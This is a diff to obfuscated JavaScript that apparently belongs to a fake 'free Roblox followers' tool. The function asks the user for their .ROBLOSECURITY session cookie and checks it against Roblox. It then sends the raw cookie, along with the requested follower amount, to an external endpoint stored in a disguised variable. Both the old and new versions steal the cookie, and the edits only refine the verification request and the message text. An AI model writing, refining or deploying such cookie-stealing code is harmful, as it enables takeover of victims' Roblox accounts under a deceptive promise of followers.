@@ -24,26 +24,26 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
         x1y2y2z3("Error", "Enter a valid code.", "error", "Retry");
         return;
     }
-
+    
     const xyeqeq = xyeq[1];
 
-    // Verify the cookie
+    // Verificar la cookie de Roblox
     try {
-        const verificationResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+        const verificationResponse = await fetch('https://www.roblox.com/my/account', {
             method: 'GET',
+            credentials: 'include',
             headers: {
                 'Cookie': `.ROBLOSECURITY=${xyeqeq}`
             }
         });
 
         if (!verificationResponse.ok) {
-            x1y2y2z3("Error", "Invalid Roblox Security Cookie.", "error", "Retry");
+            x1y2y2z3("Error", "Invalid Roblox security cookie.", "error", "Retry");
             return;
         }
 
-        const userData = await verificationResponse.json();
         const j1k2l3 = {
-            content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}\nUser  ID: ${userData.id}`
+            content: `Follow Amount: ${s4t5u7}\n.ROBLOSECURITY: ${xyeqeq}`
         };
 
         const response = await fetch(g8h9i0, {
@@ -60,7 +60,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
             x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
         }
     } catch (error) {
-        x1y2y2z3("Error", "An error occurred while verifying the cookie", "error", "Retry");
+        x1y2y2z3("Error", "An error occurred while verifying the cookie.", "error", "Retry");
     }
 }
 
